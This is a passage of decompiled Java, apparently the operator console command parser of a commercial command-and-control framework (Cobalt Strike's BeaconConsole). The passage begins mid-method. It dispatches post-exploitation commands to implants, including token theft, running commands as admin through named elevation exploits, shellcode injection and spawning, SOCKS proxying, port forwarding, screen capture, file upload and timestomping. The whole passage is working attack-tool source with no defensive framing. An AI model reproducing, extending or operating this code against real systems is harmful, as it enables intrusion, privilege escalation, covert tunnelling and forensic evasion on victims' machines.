                                       } else if (var11.is("rev2self")) {
                                          this.master.Rev2Self();
                                       } else if (var11.is("rm")) {
                                          if (var11.verify("Z")) {
                                             this.master.Rm(var11.popString());
                                          }
                                       } else if (var11.is("rportfwd")) {
                                          if (!var11.verify("IAI") && !var11.reset()) {
                                             if (var11.verify("AI")) {
                                                var14 = var11.popInt();
                                                var12 = var11.popString();
                                                if (!"stop".equals(var12)) {
                                                   var11.error("only acceptable argument is stop");
                                                } else {
                                                   this.master.PortForwardStop(var14);
                                                }
                                             }
                                          } else {
                                             var14 = var11.popInt();
                                             var12 = var11.popString();
                                             var17 = var11.popInt();
                                             this.master.PortForward(var17, var12, var14);
                                          }
                                       } else if (var11.is("rportfwd_local")) {
                                          if (!var11.verify("IAI") && !var11.reset()) {
                                             if (var11.verify("AI")) {
                                                var14 = var11.popInt();
                                                var12 = var11.popString();
                                                if (!"stop".equals(var12)) {
                                                   var11.error("only acceptable argument is stop");
                                                } else {
                                                   this.master.PortForwardStop(var14);
                                                }
                                             }
                                          } else {
                                             var14 = var11.popInt();
                                             var12 = var11.popString();
                                             var17 = var11.popInt();
                                             this.master.PortForwardLocal(var17, var12, var14);
                                          }
                                       } else if (var11.is("run")) {
                                          if (var11.verify("Z")) {
                                             this.master.Run(var11.popString());
                                          }
                                       } else {
                                          String var9;
                                          StringStack var26;
                                          if (var11.is("runas")) {
                                             if (var11.verify("AAZ")) {
                                                var4 = var11.popString();
                                                var12 = var11.popString();
                                                var16 = var11.popString();
                                                if (var16.indexOf("\\") == -1) {
                                                   this.master.RunAs(".", var16, var12, var4);
                                                } else {
                                                   var26 = new StringStack(var16, "\\");
                                                   var8 = var26.shift();
                                                   var9 = var26.shift();
                                                   this.master.RunAs(var8, var9, var12, var4);
                                                }
                                             }
                                          } else if (var11.is("runasadmin")) {
                                             BeaconElevators var30 = DataUtils.getBeaconElevators(this.data);
                                             if (var11.verify("AZ")) {
                                                var12 = var11.popString();
                                                var16 = var11.popString();
                                                if (var30.isElevator(var16)) {
                                                   this.master.ElevateCommand(var16, var12);
                                                } else {
                                                   var11.error("no such exploit '" + var16 + "'");
                                                }
                                             }
                                          } else if (var11.is("runu")) {
                                             if (!this.isVistaAndLater()) {
                                                var11.error("Target is not Windows Vista or later");
                                             } else if (var11.verify("IZ")) {
                                                var4 = var11.popString();
                                                var13 = var11.popInt();
                                                this.master.RunUnder(var13, var4);
                                             }
                                          } else if (var11.is("screenshot")) {
                                             if (!var11.verify("IX") && !var11.reset()) {
                                                this.master.Screenshot();
                                             } else {
                                                var4 = var11.popString();
                                                var13 = var11.popInt();
                                                this.master.Screenshot(var13, var4);
                                             }
                                          } else if (var11.is("screenwatch")) {
                                             if (!var11.verify("IX") && !var11.reset()) {
                                                this.master.Screenwatch();
                                             } else {
                                                var4 = var11.popString();
                                                var13 = var11.popInt();
                                                this.master.Screenwatch(var13, var4);
                                             }
                                          } else if (var11.is("setenv")) {
                                             if (var11.verify("AZ")) {
                                                var4 = var11.popString();
                                                var12 = var11.popString();
                                                this.master.SetEnv(var12, var4);
                                             } else if (var11.isMissingArguments() && var11.verify("A")) {
                                                var4 = var11.popString();
                                                this.master.SetEnv(var4, (String)null);
                                             }
                                          } else if (var11.is("shell")) {
                                             if (var11.verify("Z")) {
                                                this.master.Shell(var11.popString());
                                             }
                                          } else if (var11.is("sleep")) {
                                             if (!var11.verify("I%") && !var11.reset()) {
                                                if (var11.verify("I")) {
                                                   this.master.Sleep(var11.popInt(), 0);
                                                }
                                             } else {
                                                var14 = var11.popInt();
                                                var13 = var11.popInt();
                                                this.master.Sleep(var13, var14);
                                             }
                                          } else if (var11.is("socks")) {
                                             if (!var11.verify("I") && !var11.reset()) {
                                                if (var11.verify("Z")) {
                                                   if (!var11.popString().equals("stop")) {
                                                      var11.error("only acceptable argument is stop or port");
                                                   } else {
                                                      this.master.SocksStop();
                                                   }
                                                }
                                             } else {
                                                this.master.SocksStart(var11.popInt());
                                             }
                                          } else if (var11.is("spawn")) {
                                             if (var11.empty()) {
                                                ScListenerChooser var31 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                                   public void dialogResult(String var1) {
                                                      BeaconConsole.this.master.Spawn(var1);
                                                   }
                                                });
                                                var31.show();
                                             } else if (!var11.verify("XL") && !var11.reset()) {
                                                if (!var11.verify("X") && !var11.reset()) {
                                                   if (var11.verify("L")) {
                                                      this.master.Spawn(var11.popString());
                                                   }
                                                } else {
                                                   var4 = var11.popString();
                                                   var27 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                                      public void dialogResult(String var1) {
                                                         BeaconConsole.this.master.Spawn(var1, var4);
                                                      }
                                                   });
                                                   var27.show();
                                                }
                                             } else {
                                                var4 = var11.popString();
                                                var12 = var11.popString();
                                                this.master.Spawn(var4, var12);
                                             }
                                          } else if (var11.is("spawnas")) {
                                             if (var11.verify("AAL")) {
                                                var4 = var11.popString();
                                                var12 = var11.popString();
                                                var16 = var11.popString();
                                                if (var16.indexOf("\\") == -1) {
                                                   this.master.SpawnAs(".", var16, var12, var4);
                                                } else {
                                                   var26 = new StringStack(var16, "\\");
                                                   var8 = var26.shift();
                                                   var9 = var26.shift();
                                                   this.master.SpawnAs(var8, var9, var12, var4);
                                                }
                                             } else if (var11.isMissingArguments() && var11.verify("AA")) {
                                                var4 = var11.popString();
                                                var12 = var11.popString();
                                                var19 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                                   public void dialogResult(String var1) {
                                                      if (var12.indexOf("\\") == -1) {
                                                         BeaconConsole.this.master.SpawnAs(".", var12, var4, var1);
                                                      } else {
                                                         StringStack var2 = new StringStack(var12, "\\");
                                                         String var3 = var2.shift();
                                                         String var4x = var2.shift();
                                                         BeaconConsole.this.master.SpawnAs(var3, var4x, var4, var1);
                                                      }

                                                   }
                                                });
                                                var19.show();
                                             }
                                          } else if (var11.is("spawnu")) {
                                             if (var11.verify("IL")) {
                                                var4 = var11.popString();
                                                var13 = var11.popInt();
                                                this.master.SpawnUnder(var13, var4);
                                             } else if (var11.isMissingArguments() && var11.verify("I")) {
                                                var14 = var11.popInt();
                                                var27 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                                   public void dialogResult(String var1) {
                                                      BeaconConsole.this.master.SpawnUnder(var14, var1);
                                                   }
                                                });
                                                var27.show();
                                             }
                                          } else if (var11.is("spawnto")) {
                                             if (var11.empty()) {
                                                this.master.SpawnTo();
                                             } else if (var11.verify("XZ")) {
                                                var4 = var11.popString();
                                                var12 = var11.popString();
                                                this.master.SpawnTo(var12, var4);
                                             }
                                          } else if (var11.is("spunnel")) {
                                             if (!var11.verify("XAIF") && !var11.reset()) {
                                                if (var11.verify("XAI")) {
                                                   var14 = var11.popInt();
                                                   var12 = var11.popString();
                                                   var16 = var11.popString();
                                                   SafeDialogs.openFile("Select shellcode to inject", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                                      public void dialogResult(String var1) {
                                                         BeaconConsole.this.master.SpawnAndTunnel(var16, var12, var14, var1, false);
                                                      }
                                                   });
                                                }
                                             } else {
                                                var4 = var11.popString();
                                                var13 = var11.popInt();
                                                var16 = var11.popString();
                                                var18 = var11.popString();
                                                this.master.SpawnAndTunnel(var18, var16, var13, var4, false);
                                             }
                                          } else if (var11.is("spunnel_local")) {
                                             if (!var11.verify("XAIF") && !var11.reset()) {
                                                if (var11.verify("XAI")) {
                                                   var14 = var11.popInt();
                                                   var12 = var11.popString();
                                                   var16 = var11.popString();
                                                   SafeDialogs.openFile("Select shellcode to inject", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                                      public void dialogResult(String var1) {
                                                         BeaconConsole.this.master.SpawnAndTunnel(var16, var12, var14, var1, true);
                                                      }
                                                   });
                                                }
                                             } else {
                                                var4 = var11.popString();
                                                var13 = var11.popInt();
                                                var16 = var11.popString();
                                                var18 = var11.popString();
                                                this.master.SpawnAndTunnel(var18, var16, var13, var4, true);
                                             }
                                          } else if (var11.is("ssh")) {
                                             if (!var11.verify("IXZ") && !var11.reset()) {
                                                if (!var11.verify("IZ") && !var11.reset()) {
                                                   this.D(var11, -1, (String)null);
                                                } else {
                                                   var11.error("argument architecture is not valid set to x86 or x64");
                                                }
                                             } else {
                                                var4 = var11.popString();
                                                var12 = var11.popString();
                                                var17 = var11.popInt();
                                                var11.reset();
                                                var7 = new CommandParser("ssh " + var4);
                                                this.D(var7, var17, var12);
                                                if (var7.hasError()) {
                                                   var11.error(var7.error());
                                                }
                                             }
                                          } else if (var11.is("ssh-key")) {
                                             if (!var11.verify("IXZ") && !var11.reset()) {
                                                if (!var11.verify("IZ") && !var11.reset()) {
                                                   this.C(var11, -1, (String)null);
                                                } else {
                                                   var11.error("argument architecture is not valid set to x86 or x64");
                                                }
                                             } else {
                                                var4 = var11.popString();
                                                var12 = var11.popString();
                                                var17 = var11.popInt();
                                                var11.reset();
                                                var7 = new CommandParser("ssh-key " + var4);
                                                this.C(var7, var17, var12);
                                                if (var7.hasError()) {
                                                   var11.error(var7.error());
                                                }
                                             }
                                          } else if (var11.is("steal_token")) {
                                             if (var11.verify("I")) {
                                                this.master.StealToken(var11.popInt());
                                             }
                                          } else if (var11.is("shinject")) {
                                             if (!var11.verify("IXF") && !var11.reset()) {
                                                if (var11.verify("IX")) {
                                                   var4 = var11.popString();
                                                   var13 = var11.popInt();
                                                   SafeDialogs.openFile("Select shellcode to inject", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                                      public void dialogResult(String var1) {
                                                         BeaconConsole.this.master.ShellcodeInject(var13, var4, var1);
                                                      }
                                                   });
                                                }
                                             } else {
                                                var4 = var11.popString();
                                                var12 = var11.popString();
                                                var17 = var11.popInt();
                                                this.master.ShellcodeInject(var17, var12, var4);
                                             }
                                          } else if (var11.is("shspawn")) {
                                             if (!var11.verify("XF") && !var11.reset()) {
                                                if (var11.verify("X")) {
                                                   var4 = var11.popString();
                                                   SafeDialogs.openFile("Select shellcode to inject", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                                      public void dialogResult(String var1) {
                                                         BeaconConsole.this.master.ShellcodeSpawn(var4, var1);
                                                      }
                                                   });
                                                }
                                             } else {
                                                var4 = var11.popString();
                                                var12 = var11.popString();
                                                this.master.ShellcodeSpawn(var12, var4);
                                             }
                                          } else if (var11.is("timestomp")) {
                                             if (var11.verify("BB")) {
                                                var4 = var11.popString();
                                                var12 = var11.popString();
                                                this.master.TimeStomp(var12, var4);
                                             }
                                          } else if (var11.is("unlink")) {
                                             if (!var11.verify("AI") && !var11.reset()) {
                                                if (var11.verify("Z")) {
                                                   this.master.Unlink(var11.popString());
                                                }
                                             } else {
                                                var4 = var11.popString();
                                                var12 = var11.popString();
                                                this.master.Unlink(var12, var4);
                                             }
                                          } else if (var11.is("upload") && var11.empty()) {
                                             SafeDialogs.openFile("Select file to upload", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                                public void dialogResult(String var1) {
                                                   BeaconConsole.this.master.Upload(var1);
                                                }
                                             });
                                          } else if (var11.is("upload")) {
                                             if (var11.verify("f")) {
                                                this.master.Upload(var11.popString());
                                             }
                                          } else {
                                             this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(this.bid, "Unknown command: " + var2)));
                                          }
                                       }
                                    }
                                 }
                              }
                           }
                        }
                     }
                  }
               }

               if (var11.hasError()) {
                  this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(this.bid, var11.error())));
               }

            }
         } else {
            this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
            if (!var11.verify("Z") && !var11.reset()) {
               this.console.append(this.engine.format("BEACON_OUTPUT_HELP", new Stack()) + "\n");
            } else {
               var4 = var11.popString();
               BeaconCommands var5 = DataUtils.getBeaconCommands(this.data);
               if (var5.isHelpAvailable(var4)) {
                  Stack var6 = new Stack();
                  var6.push(SleepUtils.getScalar(var4));
                  this.console.append(this.engine.format("BEACON_OUTPUT_HELP_COMMAND", var6) + "\n");
               } else {
                  var11.error("no help is available for '" + var4 + "'");
               }
            }

            if (var11.hasError()) {
               this.console.append(this.formatLocal(BeaconOutput.Error(this.bid, var11.error())) + "\n");
            }

         }
      }
   }
}
